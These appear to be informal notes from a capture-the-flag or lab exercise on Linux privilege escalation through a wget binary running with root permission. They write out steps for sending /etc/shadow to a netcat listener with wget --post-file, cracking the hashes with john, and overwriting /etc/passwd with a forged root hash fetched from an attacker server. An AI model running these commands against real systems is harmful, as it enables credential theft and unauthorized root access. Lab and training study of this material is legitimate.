export IP=10.10.10.10
nmap -sn $IP
pgrep openvpn = On Unix-like operating systems, the pgrep command searches for processes currently running on the system, based on a complete or partial process name, or other specified attributes.

it has unapp tamplate

/usr/bin/wget is in root permission

__GTFOBins__
go to gtfobins and check abt wget

copy file
scp -i rsafile /opt/linpeas.sh jassie@10.10.10.10:/dev/shm

download psswd and shadow
/usr/bin/wget --post-file=/etc/shadow 10.10.10.10
nc -lvnp 80(since it wget)

unshadow passwd and shadow
unshadow passwd shadow > unshadow.txt

crack it
john -wordlist=rockyou.txt unshadow.txt

__john hammond method__
python
import crypt
crypt.crypt("ourpasswd","none")
_copy the generated passwd and paste it in root /etc/passwd_
(clear x in :x: and paste the new generated passwd)

_othermethod = openssl passwd passwdtexthere_- and do the same

upload it to /etc/passwd
(first create a real copy of /etc/passwd in /dev/shm)
start a python server 

in victim machine:
wget http://10.10.10.10:8000/passwd -O /etc/passwd

__method was in comment__
edit /etc/sudoers

search SUID flag

